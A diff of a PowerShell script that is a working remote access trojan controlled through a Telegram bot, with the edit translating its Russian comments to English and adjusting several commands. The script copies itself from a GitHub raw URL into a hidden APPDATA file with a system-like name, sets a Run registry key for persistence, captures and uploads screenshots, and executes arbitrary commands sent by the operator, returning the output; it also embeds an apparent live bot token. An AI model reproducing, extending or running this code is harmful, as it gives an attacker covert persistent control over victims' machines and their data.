@@ -1,23 +1,22 @@
-# --- НАСТРОЙКИ ---
+# --- CONFIG ---
 $token = "8220355086:AAFI1_k4FoKIF18FShkBn0yezO5dDldzs88"
 $admin_id = "6494641721"
-# Ссылка на этот же файл (RAW)
 $url_raw = "https://raw.githubusercontent.com/tidomail13719-art/safe-test-/main/test"
 
 $install_path = "$env:APPDATA\win_services.ps1"
 $registry_name = "WindowsHostService"
 
-# 1. ЗАКРЕПЛЕНИЕ
+# 1. PERSISTENCE
 if ($PSCommandPath -ne $install_path) {
     try {
-        (New-Object Net.WebClient).DownloadFile($url_raw, $install_path)
+        Invoke-WebRequest -Uri $url_raw -OutFile $install_path
         (Get-Item $install_path).Attributes = 'Hidden'
         $val = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$install_path`""
         Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $registry_name -Value $val
     } catch { }
 }
 
-# 2. ФУНКЦИИ
+# 2. FUNCTIONS
 function Send-TG ($text) {
     $url = "https://api.telegram.org/bot$token/sendMessage"
     $body = @{ chat_id = $admin_id; text = "[$env:COMPUTERNAME] $text"; parse_mode = "Markdown" }
@@ -36,32 +35,31 @@ function Get-Screenshot {
         $graphics.Dispose(); $bmp.Dispose()
         curl.exe -F "chat_id=$admin_id" -F "photo=@$path" "https://api.telegram.org/bot$token/sendPhoto"
         Remove-Item $path
-    } catch { Send-TG "Ошибка скриншота: $_" }
+    } catch { Send-TG "Error: $_" }
 }
 
-# Оповещение
-Send-TG "🦾 **Агент активен!**`nЗакрепление: OK"
+# STARTUP NOTIFY
+Send-TG "🦾 **Online!**"
 
-# 3. ЦИКЛ
+# 3. MAIN LOOP
 $last_id = 0
 while($true) {
     try {
-        $updates = Invoke-RestMethod "https://api.telegram.org/bot$token/getUpdates?offset=$($last_id + 1)"
+        $updates = Invoke-RestMethod "https://api.telegram.org/bot$token/getUpdates?offset=$($last_id + 1)&timeout=30"
         foreach ($upd in $updates.result) {
             $last_id = $upd.update_id
-            $cmd = $upd.message.text
             if ($upd.message.from.id -eq $admin_id) {
+                $cmd = $upd.message.text
                 if ($cmd -eq "shot") { Get-Screenshot }
                 elseif ($cmd -eq "kill") { 
                     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $registry_name
-                    Send-TG "💀 Самоликвидация..."; exit 
+                    Send-TG "💀 Offline."; exit 
                 }
                 else {
                     $out = iex $cmd 2>&1 | Out-String
-                    if ($out) { Send-TG "📄 Ответ:`n```$out```" }
+                    if ($out) { Send-TG "📄 Output:`n```$out```" }
                 }
             }
         }
-    } catch { }
-    Start-Sleep -Seconds 3
+    } catch { Start-Sleep -Seconds 5 }
 }
